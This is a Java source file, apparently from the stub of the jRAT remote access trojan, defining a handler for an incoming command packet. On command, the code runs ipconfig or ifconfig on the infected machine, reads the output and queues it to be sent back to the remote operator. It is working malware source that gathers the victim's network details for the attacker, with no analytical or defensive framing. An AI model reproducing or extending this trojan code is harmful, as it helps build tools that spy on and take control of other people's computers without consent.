package pro.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import pro.jrat.common.OperatingSystem;
import pro.jrat.stub.Connection;
import pro.jrat.stub.packets.outgoing.Packet50IPConfig;

public class Packet72IPConfig extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Process p = Runtime.getRuntime().exec(OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS ? "ipconfig" : "ifconfig");

		BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

		int n = 0;

		String ipconfig = "";

		while (true) {
			String line = reader.readLine();
			if (n > 5) {
				break;
			}
			if (line == null) {
				ipconfig += " \n";
				n++;
			} else {
				ipconfig += line + "\n";
				n = 0;
			}
		}
		reader.close();

		Connection.addToSendQueue(new Packet50IPConfig(ipconfig));
	}

}
